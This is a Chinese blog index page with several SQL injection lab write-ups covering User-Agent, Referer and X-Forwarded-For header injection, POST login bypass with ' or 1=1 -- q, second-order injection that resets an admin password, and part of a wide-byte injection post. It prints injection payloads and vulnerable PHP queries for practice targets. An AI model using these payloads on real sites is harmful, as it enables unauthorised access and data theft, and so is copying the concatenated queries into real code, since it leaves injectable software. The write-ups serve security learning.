<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="欢迎">
<meta property="og:type" content="website">
<meta property="og:title" content="kilig&#39;s Blog">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="kilig&#39;s Blog">
<meta property="og:description" content="欢迎">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="kiligwh">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>kilig's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">kilig's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">If it is a rose,it will blossom</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kiligwh"
      src="/images/kilig.gif">
  <p class="site-author-name" itemprop="name">kiligwh</p>
  <div class="site-description" itemprop="description">欢迎</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/SQL%E6%B3%A8%E5%85%A5-Header%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/16/SQL%E6%B3%A8%E5%85%A5-Header%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-Header注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-16 11:26:13" itemprop="dateCreated datePublished" datetime="2022-11-16T11:26:13+08:00">2022-11-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 21:28:30" itemprop="dateModified" datetime="2023-03-07T21:28:30+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-Header注入"><a href="#SQL注入-Header注入" class="headerlink" title="SQL注入-Header注入"></a>SQL注入-Header注入</h1><hr>
<h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a>HEADER</h2><p>HTTP消息头是指，在超文本传输协议（ HTTP）的请求和响应消息中，协议头部分的那些组件</p>
<p>HTTP Header内容的组织形式，大体分为Request和Response两部分</p>
<p>HTTP消息头支持自定义</p>
<blockquote>
<p>在Requests部分中，几个常见参数</p>
</blockquote>
<table>
<thead>
<tr>
<th>常见参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>User-Agent</td>
<td>记录用户所使用的浏览器信息</td>
</tr>
<tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可以支持的web服务器返回内容压缩编码类型</td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求的内容长度</td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接</td>
</tr>
<tr>
<td>Referer</td>
<td>先前网页的地址,从哪个网站访问过来的</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</td>
</tr>
<tr>
<td>Host</td>
<td>指定请求的服务器的域名和端口号</td>
</tr>
<tr>
<td>X-Forwarded-For</td>
<td>用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</td>
</tr>
</tbody></table>
<h2 id="注入场景"><a href="#注入场景" class="headerlink" title="注入场景"></a>注入场景</h2><p>在一些网站中，用户登录后会记录用户的cookie、ip、UA、Referer等等<br>与数据库交互的位置就有可能存在注入点</p>
<h2 id="User-Agent（UA）注入"><a href="#User-Agent（UA）注入" class="headerlink" title="User-Agent（UA）注入"></a>User-Agent（UA）注入</h2><p>1、进入靶场，发现是登录框，直接上万能密码 ‘ or 1 — q<br><img src="https://img-blog.csdnimg.cn/20210410163744837.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410163826303.png" alt="在这里插入图片描述"></p>
<p>2、得到警告，’ 被限制，观察登录框没有验证码之类的限制，用暴力破解<br><img src="https://img-blog.csdnimg.cn/20210410163859817.png" alt="在这里插入图片描述"></p>
<p>3.使用admin 密码为123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410163913392.png" alt="在这里插入图片描述"></p>
<p>4、登录成功，打开源码，发现后台记录了我的UA，尝试UA处有没有注入<br><img src="https://img-blog.csdnimg.cn/20210410163930356.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410163937906.png" alt="在这里插入图片描述"><br>5、抓包后在UA处使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410164111815.png" alt="在这里插入图片描述"><br>6、报错错误 to use near ‘admin’)’<br>可能UA与用户名进行了绑定记录，记录是插入语句，进行闭合，构造payload：<br>‘ and updatexml(1,concat(0x7e,version()),1),’admin’) — q<br><img src="https://img-blog.csdnimg.cn/2021041016405516.png" alt="**加粗样式**"><br>7、payload成功，5.0以上版本，可以使用information_schema数据库，爆出当前数据库中的第一个表名<br><img src="https://img-blog.csdnimg.cn/20210410164146549.png" alt="在这里插入图片描述"></p>
<p>8、flag可能存在与flag_head表，故爆出flag_head表的字段名<br><img src="https://img-blog.csdnimg.cn/2021041016420314.png" alt="在这里插入图片描述"></p>
<p>9、得出 flag_h1字段名，接着得出flag_h1字段中的信息<br><img src="https://img-blog.csdnimg.cn/20210410164218111.png" alt="在这里插入图片描述"></p>
<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><p>1、直接使用admin 123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410164317261.png" alt="在这里插入图片描述"></p>
<p>2、打开源码，发现后台这次记录的是referer<br><img src="https://img-blog.csdnimg.cn/20210410164324366.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410164331113.png" alt="在这里插入图片描述"><br>3、抓包，对referer处 使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410164409300.png" alt="在这里插入图片描述"><br>4、爆出错误，使用updatexml()函数进行报错注入，构造payload<br><img src="https://img-blog.csdnimg.cn/2021041016445430.png" alt="在这里插入图片描述"><br>5、爆出表名<br><img src="https://img-blog.csdnimg.cn/20210410164522458.png" alt="在这里插入图片描述"></p>
<p>6、爆出flag_head表的字段名<br><img src="https://img-blog.csdnimg.cn/20210410164531404.png" alt="在这里插入图片描述"></p>
<p>7、得出flag_h1字段的信息<br><img src="https://img-blog.csdnimg.cn/20210410164542107.png" alt="在这里插入图片描述"></p>
<h2 id="IP注入"><a href="#IP注入" class="headerlink" title="IP注入"></a>IP注入</h2><p>1、使用admin 123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410164620700.png" alt="在这里插入图片描述"></p>
<p>2、打开源码，发现这次记录的是IP地址<br><img src="https://img-blog.csdnimg.cn/20210410164629959.png" alt="在这里插入图片描述"></p>
<p>3、思考：在HTTP请求中没有发现含有IP地址的位置，但是在对HTTP数据包抓包后可以自行添加删除<br>X-Forwarded-For(XFF) 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段，也称为透明代理<br>故可以自行添加 X-Forwarded-For到HTTP请求头中<br><img src="https://img-blog.csdnimg.cn/20210410164648424.png" alt="在这里插入图片描述"></p>
<p>4、直接构造payload<br><img src="https://img-blog.csdnimg.cn/20210410164658726.png" alt="在这里插入图片描述"></p>
<p>5、其他操作步骤与以上操作相同，故直接爆出结果<br><img src="https://img-blog.csdnimg.cn/20210410164711428.png" alt="在这里插入图片描述"></p>
<h2 id="cookie注入或者其他参数注入类似操作"><a href="#cookie注入或者其他参数注入类似操作" class="headerlink" title="cookie注入或者其他参数注入类似操作"></a>cookie注入或者其他参数注入类似操作</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大部分在情况下，只有在登录的情况下，后台才会记录用户的ip、Referer等信息，故在进行header头注入之前需要有正确的账号密码进行登录</p>
<p>注意：<br>报错注入函数除了updatexml()，extractvalue()函数也可以<br>extractvalue()函数语法：extractvalue(目标xml文档，xml路径)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/SQL%E6%B3%A8%E5%85%A5-POST%E5%9E%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/14/SQL%E6%B3%A8%E5%85%A5-POST%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-POST型</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-14 16:25:06" itemprop="dateCreated datePublished" datetime="2022-11-14T16:25:06+08:00">2022-11-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 21:28:41" itemprop="dateModified" datetime="2023-03-07T21:28:41+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-POST型"><a href="#SQL注入-POST型" class="headerlink" title="SQL注入-POST型"></a>SQL注入-POST型</h1><hr>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>POST型注入与GET型注入操作上没有任何区别</p>
<p>仅是HTTP的请求方式不同罢了</p>
<p>GET型出现的注入类型，POST型都有可能出现</p>
<h2 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h2><p>登录</p>
<p>更改密码</p>
<p>注册</p>
<p>等敏感信息处一般都会使用post请求方式</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、登录框，一般情况下<br><img src="https://img-blog.csdnimg.cn/20210410155008673.png" alt="在这里插入图片描述"></p>
<p>2、随便输入，打开burpsuite进行抓包<br>抓包数据包，发送到repeater模块<br><img src="https://img-blog.csdnimg.cn/20210410153559506.png" alt="在这里插入图片描述"></p>
<p>3、使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410153651134.png" alt="**加粗样式**"><br>产生报错信息<br><img src="https://img-blog.csdnimg.cn/20210410153732552.png" alt="在这里插入图片描述"></p>
<p>4、猜想username传入的值会不会被单引号包裹，故可以进行构造闭合</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- q</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410155117143.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210410155129601.png" alt="在这里插入图片描述"></p>
<p>‘ or 1&#x3D;1 – q 也称为万能密码<br><strong>原理：</strong><br>后端代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>当username变量得到传参’ or 1&#x3D;1 – q</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;&#x27; or 1=1 -- q &#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>前面的单引号闭合掉，or 1&#x3D;1 为真，– q注释掉后面的</p>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>‘ or 1&#x3D;1 – q ，根据参数包裹方式不同，单引号可适当做变化</p>
<p>5、猜测字段数<br><img src="https://img-blog.csdnimg.cn/2021041015521477.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210410155223850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>字段数为3</p>
<p>6、使用联合查询，观察回显点<br><img src="https://img-blog.csdnimg.cn/2021041015531029.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7、得到回显点2,3，查看版本号和当前数据库名<br><img src="https://img-blog.csdnimg.cn/20210410155328637.png" alt="在这里插入图片描述"><br>8、利用information_schema数据库得出数据<br>9、爆出当前数据库下的表名<br><img src="https://img-blog.csdnimg.cn/2021041015543268.png" alt="在这里插入图片描述"></p>
<p>10、爆出表名flag，user，爆出flag表中的字段名<br><img src="https://img-blog.csdnimg.cn/20210410155542239.png" alt="在这里插入图片描述"><br>11、得到id、flag字段信息的值<br><img src="https://img-blog.csdnimg.cn/2021041015560744.png" alt="在这里插入图片描述"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/12/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/12/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-二次注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-12 18:21:27" itemprop="dateCreated datePublished" datetime="2022-11-12T18:21:27+08:00">2022-11-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 23:26:45" itemprop="dateModified" datetime="2023-03-07T23:26:45+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-二次注入"><a href="#SQL注入-二次注入" class="headerlink" title="SQL注入-二次注入"></a>SQL注入-二次注入</h1><hr>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>二次注入是通过与数据库服务器进行交互的过程再次进行注入</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>用户输入恶意语句</p>
<p>数据库把用户输入的数据没有做任何更改，直接进行了存储</p>
<p>再用户取出数据的过程中，数据库将用户输入的数据完整且没有做任何修饰的展示给用户</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>常常发生在注册页面，插入恶意语句，在仅知道管理员的账号，但是不知道密码的情况下，改掉管理员的密码</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、一个登录界面，可进行更改密码、注册用户</p>
<p><img src="https://img-blog.csdnimg.cn/20210410145002978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、查看数据库中原有的数据<br><img src="https://img-blog.csdnimg.cn/20210410145042112.png" alt="在这里插入图片描述"></p>
<p>3、目的：改掉admin用户的密码</p>
<p>4、注册用户</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册用户名为admin&#x27; -- q</span><br><span class="line">密码为<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410150507893.png" alt="在这里插入图片描述"><br>5、注册成功<br><img src="https://img-blog.csdnimg.cn/20210410150623996.png" alt="在这里插入图片描述"><br>6、查看数据库有无增加用户<br><img src="https://img-blog.csdnimg.cn/20210410150646738.png" alt="在这里插入图片描述"><br>7、使用用户名admin’ – q 登录<br>8、观察admin用户的密码为admin<br><img src="https://img-blog.csdnimg.cn/20210410151149324.png" alt="在这里插入图片描述"></p>
<p>9、更改admin’ – q用户的密码为654321<br><img src="https://img-blog.csdnimg.cn/20210410150850863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410150911755.png" alt="在这里插入图片描述"></p>
<p>10、再次查看数据库<br><img src="https://img-blog.csdnimg.cn/20210410150937662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到新注册的用户admin’ – q 密码没改变，admin用户的密码却更改为654321</p>
<p>11、使用admin用户登录<br><img src="https://img-blog.csdnimg.cn/20210410151109648.png" alt="在这里插入图片描述"><br>登录成功</p>
<h2 id="能够更改admin密码原理"><a href="#能够更改admin密码原理" class="headerlink" title="能够更改admin密码原理"></a>能够更改admin密码原理</h2><p>1、更改密码处的后端代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure>

<p>2、当我们使用admin’ – q用户名 更改密码时 代码变为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27; -- q&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure>

<p>username&#x3D;’admin’ – q’&#x3D;&#x3D;&gt;此处admin’构成闭合，用户名变为amdin用户，– q则注释了后面的单引号<br>故可以使用 用户名admin’ – q 密码123456 登录，然后更改用户名admin的密码</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-宽字节注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-11 19:39:41" itemprop="dateCreated datePublished" datetime="2022-11-11T19:39:41+08:00">2022-11-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 21:29:10" itemprop="dateModified" datetime="2023-03-07T21:29:10+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-宽字节注入"><a href="#SQL注入-宽字节注入" class="headerlink" title="SQL注入-宽字节注入"></a>SQL注入-宽字节注入</h1><hr>
<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><p>GBK 编码 两个字节表示一个字符</p>
<p>ASCII 编码 一个字节表示一个字符</p>
<p>MYSQL默认字节集是GBK等宽字节字符集</p>
